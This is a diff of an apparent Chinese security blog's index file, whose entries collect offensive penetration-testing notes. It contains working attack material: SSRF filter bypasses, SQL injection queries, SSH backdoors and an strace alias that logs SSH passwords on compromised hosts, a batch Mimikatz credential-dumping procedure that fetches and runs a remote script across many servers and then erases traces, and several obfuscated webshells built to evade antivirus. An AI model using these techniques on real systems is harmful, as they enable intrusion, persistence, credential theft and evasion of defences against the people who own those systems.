@@ -12,31 +12,49 @@
     <title><![CDATA[SSRF中的绕过姿势]]></title>
     <url>%2Farchives%2Fc0cf419.html</url>
     <content type="text"><![CDATA[从以下URL关键字中寻找SSRF漏洞： share wap url link src source target u 3g display sourceURl imageURL domain ...http://127.0.0.1/ 被过滤的时候，可以尝试一下几种方式： 1、@ http://abc@127.0.0.12、添加端口号 http://127.0.0.1:80803、短地址 http://dwz.cn/11SMa4、可以指向任意ip的域名：xip.io 10.0.0.1.xip.io 10.0.0.1 www.10.0.0.1.xip.io 10.0.0.1 mysite.10.0.0.1.xip.io 10.0.0.1 foo.bar.10.0.0.1.xip.io 10.0.0.15、ip地址转换成进制来访问 115.239.210.26 ＝ 16373751032首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制！访问使用http://00+转换后十六进制 115.239.210.26 = 0x73.0xef.0xd2.0x1a八进制 115.239.210.26 = 0163.0357.0322.0032]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[不知道列名的情况下注入]]></title>
     <url>%2Farchives%2Fa90cd968.html</url>
     <content type="text"><![CDATA[0x00 简介mysql版本,低于5.4的除了堆叠,别的就写不了了在 mysql =&gt; 5 的版本中存在库information_schema,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？ 在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。0x01 不使用表名查询正常的查询如下： 其中，列名为id,name,pass,mail,phone，使用union查询 select 1,2,3,4,5 union select * from users; 接着，就可以继续使用数字来对应列,如3对应了表里面的pass: select `3` from (select 1,2,3,4,5 union select * from users)a; 当 ` 不能使用的时候，使用别名来代替： select b from (select 1,2,3 as b,4,5 union select * from users)a; 在注入中查询多个列： select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; FROM:https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[渗透过程中的SSH(后门建立)]]></title>
     <url>%2Farchives%2F21b719d6.html</url>
     <content type="text"><![CDATA[1.入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口肉鸡上执行 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。 2.做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接在肉鸡上执行： [root@localhost ~]# cd /usr/sbin [root@localhost sbin]# mv sshd ../bin [root@localhost sbin]# echo &apos;#!/usr/bin/perl&apos; &gt;sshd [root@localhost sbin]# echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd [root@localhost sbin]# echo &apos;exec {&quot;/usr/bin/sshd&quot;} &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd [root@localhost sbin]# chmod u+x sshd [root@localhost sbin]# /etc/init.d/sshd restart 在本机执行： socat STDIO TCP4:10.18.180.20:22,sourceport=13377 如果你想修改源端口，可以用python的struct标准库实现 &gt;&gt;&gt; import struct &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,19526) &gt;&gt;&gt; print repr(buffer) &apos;\x00\x00LF&apos; &gt;&gt;&gt; buffer = struct.pack(&apos;&gt;I6&apos;,13377) &gt;&gt;&gt; print buffer4A 记录SSH客户端连接密码搞定主机后，往往想记录肉鸡SSH连接到其他主机的密码，进一步扩大战果，使用strace命令就行了。在肉鸡上修改要记录密码用户目录的.bashrc，添加一行: alias ssh=&apos;strace -o /tmp/.sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read.write.connect -s 2048 ssh&apos; 之后查看tmp目录的记录： grep &quot;read(5&quot; /tmp/.sshpwdxxxxxxxx.log]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[域渗透中找DC]]></title>
     <url>%2Farchives%2Fbd98337b.html</url>
     <content type="text"><![CDATA[1.net view net view /domain2.set log set log3.通过srv记录 nslookup -type=SRV _ldap._tcp.corp4.使用nltest nltest /dclist:corp5.使用dsquery DsQuery Server -domain corp6.使用netdom netdom query pdc这些都是win系统自带的命令，有的时候win版本不同，有的命令会不存在，所以多一种方法，多一种成功的可能性，实际渗透，自行根据目标环境变换]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[使用Invoke-Mimikatz.ps1批量获取windows密码]]></title>
     <url>%2Farchives%2Fed9d09ca.html</url>
     <content type="text"><![CDATA[通常可以使用以下方式获取登陆windows的密码：powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://dwz.cn/1OropX&apos;); Invoke-Mimikatz -DumpCreds&quot;通常在域渗透的时候，我们可能想要获得更多的密码，针对server08以后的服务器获取ntds.dit的hash以后还不一定能破解出来,所以可以通过Mimikatz来获取明文密码，但是一台一台登陆去获取会很慢且不方便，所以这里介绍一个批量的方法： 1.创建共享文件夹： cd\ mkdir open net share open=C:\open /grant:everyone,full icacls C:\open\ /grant Everyone:(OI)(CI)F /t 修改注册表 reg change HKLM\System\CurrentControlSet\services\LanmanServer\Parameters NullSessionShares REG_MULTI_SZ open reg change HKLM\System\CurrentControlSet\Control\Lsa &quot;EveryoneIncludesAnonymous&quot; 1 修改共享目录到open。 2.在共享目录添加下列文件： 1）执行脚本powershellme.cmd，脚本内容： powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.1.11:8080/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz -DumpCreds &gt; \\192.168.1.11\open\%COMPUTERNAME%.txt 2&gt;&amp;1 ip是设置共享的主机ip地址。 2）Invoke-Mimikatz.ps1 3）mongoose 4）服务器列表serverlist.txt，换行分割。 3.运行mongoose，默认开启端口8080 4.执行wmic： wmic /node:@serverlist.txt process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot;带凭证： wmic /node:@serverlist.txt /user:PROJECTMENTOR\evi1cg /password:123 process call create &quot;\\192.168.1.11\open\powershellme.cmd&quot; 5.在共享目录看各个服务器的密码吧。 6.清除记录： 1）关掉mongoose,并删除 2）net share open /delete 3）删除共享目录及文件 4）修改注册表 PS:可以使用如下命令开启PowerShell remoting： psexec @serverlist.txt -u [admin account name] -p [admin account password] -h -d powershell.exe &quot;enable-psremot]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[「木马变形」一句话木马的各种变形]]></title>
     <url>%2Farchives%2F54ea983c.html</url>
     <content type="text"><![CDATA[0x00:简介 一句话木马短小精悍，而且功能强大，隐蔽性非常好，在入侵中始终扮演着强大的作用。一句话木马一直在跟杀软斗智斗勇，出现一种，杀软秒更新规则。木马再变形，再被杀。。。出现0x01:叙事 一、常见的一句话例子： **ASP:&lt;%eval request(&quot;pass&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%Response.Write(eval(Request.Item[&quot;z&quot;],&quot;unsafe&quot;));%&gt; PHP:&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt; JSP:&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;//无回显示执行系统命令**二、简单变形**ASP:&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;//-7 ASPX:&lt;%@ Page Language = Jscript %&gt; &lt;%var/*-/*-*/P/*-/*-*/=/*-/*-*/&quot;e&quot;+&quot;v&quot;+/*-/*-*/ &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/*-/*-*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*-/*-*/+&quot;s&quot;+&quot;t&quot;+ &quot;[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]&quot;+ &quot;,&quot;+&quot;\&quot;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;\&quot;&quot;+&quot;)&quot;;eval (/*-/*-*/P/*-/*-*/,/*-/*-*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*-/*-*/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/*-/*-*/);%&gt;//-7 PHP:&lt;?php $_GET[a]($_GET[b]);?&gt; JSP:&lt;% if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes()); %&gt;**三、二次变形ASP:&lt;%if request (&quot;MH&quot;)&lt;&gt;&quot;&quot;then session(&quot;MH&quot;)=request(&quot;MH&quot;):end if:if session(&quot;MH&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;MH&quot;)%&gt; ASPX:&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[FormsAuthentication.HashPasswordForStoringInConfigFile(String.Format(&quot;{0:yyyyMMdd}&quot;,DateTime.Now.ToUniversalTime())+&quot;37E4DD20C310142564FC483DB1132F36&quot;, &quot;MD5&quot;).ToUpper()],&quot;unsafe&quot;);%&gt;//随日期变化的连接密码 PHP:&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;JSP：&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt; 三次变形ASP:&lt;%@Page Language=&quot;C#&quot; %&gt;&lt;%@Import namespace=&quot;System.Reflection&quot;%&gt;&lt;%if (Request[&quot;pass&quot;]!=null){ Session.Add(&quot;k&quot;, Guid.NewGuid().ToString().Replace(&quot;-&quot;, &quot;&quot;).Substring(16)); Response.Write(Session[0]); return;}byte[] k = Encoding.Default.GetBytes(Session[0] + &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;//蚁剑中的一句话 PHP:&lt;?php session_start();isset($_GET[&apos;pass&apos;])?print $_SESSION[&apos;k&apos;]=substr(md5(uniqid(rand())),16):($b=explode(&apos;|&apos;,openssl_decrypt(file_get_contents(&quot;php://input&quot;), &quot;AES128&quot;, $_SESSION[&apos;k&apos;])))&amp;call_user_func($b[0],$b[1]);?&gt;//蚁剑中的一句话 JSP:&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null){String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;}Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;//蚁剑中的一句话四次变形 1、利用随机异或无限免杀d盾蚁剑版： 项目地址：https://github.com/yzddmr6/as_webshell_venom 2、利用动态二进制加密实现新型一句话木马： 文章地址：https://xz.aliyun.com/t/2799 第N次变形。。。。。 0x02:后话 一句话木马变形有很多种方式，文中举例只是其中几种方式。千奇百怪的变形，不断的变化，都是为了躲避杀软的检测。杀软也在不断的更新规则库。两者都是在博弈中不断的强大。 请勿非法利用 来源:微信公众号]]></content>
+      <categories>
+        <category>渗透技巧</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[Commands 搜集(持续更新)]]></title>
@@ -57,11 +75,17 @@
     <title><![CDATA[Hashpump实现哈希长度扩展攻击]]></title>
     <url>%2Farchives%2Fa5b396d3.html</url>
     <content type="text"><![CDATA[Hashpump实现哈希长度扩展攻击]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[PHP弱类型之md5_tips(ctf经常用到PHP弱类型)]]></title>
     <url>%2Farchives%2Fc26c2571.html</url>
     <content type="text"><![CDATA[&lt;?php if (md5(&apos;240610708&apos;) == &quot;0&quot;) { echo &quot;Matches&quot;; } ?&gt; 这里md5(&apos;240610708&apos;) == &quot;0&quot; == 0e987654321 同样也相等.]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title><![CDATA[最短php一句话]]></title>
